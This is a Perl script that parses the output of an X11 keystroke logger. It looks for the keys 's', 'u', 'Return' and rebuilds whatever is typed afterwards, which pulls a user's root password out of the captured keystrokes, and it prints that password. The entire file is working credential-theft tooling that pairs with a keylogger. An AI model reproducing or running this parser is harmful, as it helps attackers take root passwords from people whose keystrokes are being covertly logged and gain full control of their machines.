#!/usr/bin/env perl
#
# x_input_parser.pl 2012 09 19
# Wat? Parser for x_input_logger
#
# Copyright john <johnatakiradotfr>
#
# TODO:  - implements other key mapping
#        - use mapping option to select the right one
#        - implements other extraction option

use strict;
use warnings;

my $VERSION = "0.01";

my %US_SHIFT_LOOKUP_TABLE = (
  "q" => "Q",
  "w" => "W",
  "e" =>  "E",
  "r" =>  "R",
  "t" =>  "T",
  "y" =>  "Y",
  "u" =>  "U",
  "i" =>  "I",
  "o" =>  "O",
  "p" =>  "P",
  "a" =>  "A",
  "s" =>  "S",
  "d" =>  "D",
  "f" =>  "F",
  "g" =>  "G",
  "h" =>  "H",
  "j" =>  "J",
  "k" =>  "K",
  "l" =>  "L",
  "z" =>  "Z",
  "x" =>  "X",
  "c" =>  "C",
  "v" =>  "V",
  "b" =>  "B",
  "n" =>  "N",
  "m" =>  "M",
  "1" =>  "!",
  "2" =>  "@",
  "3" =>  "#",
  "4" =>  "\$",
  "5" =>  "%",
  "6" =>  "^",
  "7" =>  "&",
  "8" =>  "*",
  "9" =>  "(",
  "0" =>  ")",
  "-" =>  "_",
  "=" =>  "+",
  "[" =>  "{",
  "]" =>  "}",
  ";" =>  ":",
  "'" =>  "\"",
  "\\"=>  "|",
  "," =>  "<",
  "." =>  ">",
  "/" =>  "?",
  "<" =>  ">",
  "`" =>  "~",
  );
 
my %STRING_LOOK_UP_TABLE = (
  "minus"         =>  "-",
  "equal"         =>  "=",
  "bracketleft"   =>  "[",
  "bracketright"  =>  "]",
  "semicolon"     =>  ";",
  "apostrophe"    =>  "'",
  "backslash"     =>  "\\",
  "comma"         =>  ",",
  "period"        =>  ".",
  "slash"         =>  "/",
  "less"          =>  "<",
  "grave"         =>  "`",
  );

sub extract_raw_pass {

  my (@args) = @_;
  my $filename = $args[0];
  my $raw_pass = "";
  my @start_pattern = ("s", "u", "Return");
  my $end_pattern = "Return";
  my $start_pattern_detected = 0;
  my $index_pattern = 0;

  open FILE, $filename or die $!; 
  my ($buf, $data, $n);

  while(($n = read FILE, $data, 1) != 0){
    if($data eq " "){
      if($start_pattern_detected){
        if($buf eq $end_pattern){
          return $raw_pass;
        }
        $raw_pass .= $buf;
        $raw_pass .= " ";
      }elsif($buf eq $start_pattern[$index_pattern]){
        $index_pattern += 1;
        if($index_pattern > 2){
          $start_pattern_detected = 1;
        }
      }else{
        $index_pattern = 0;
      }
      $buf = ""; 
    }else{
      $buf .= $data; 
    }
  }

  print $buf;
  close FILE;
}

sub get_root_pass {

  my ($mapping, $filename) = @_;
  my $root_pass = "";
  my @shift_keys = ("Shift_L", "Shift_R", "Caps_Lock");
  my $shift_enabled = 0;
  my $char = "";

  my $raw_pass = extract_raw_pass($filename);
  my @values = split(' ', $raw_pass);

  foreach my $value (@values){
    if(grep {$_ eq $value} @shift_keys){
      $shift_enabled = $shift_enabled ^ 1;
    }else{
      if($shift_enabled == 1){
        if(length($value) > 1){
          $char = $US_SHIFT_LOOKUP_TABLE{$STRING_LOOK_UP_TABLE{$value}};
        }else{
          $char = $US_SHIFT_LOOKUP_TABLE{$value};
        }            
      }else{
        if(length($value) > 1){
          $char = $STRING_LOOK_UP_TABLE{$value};
        }else{
          $char = $value;
        }
      }
      $root_pass .= $char; 
    } 
  }
  print $root_pass;
}

my $num_args = $#ARGV + 1;
if($num_args != 2) {
  print "Usage: parser.pl mapping filename\n";
  exit;
}

get_root_pass($ARGV[0], $ARGV[1]);
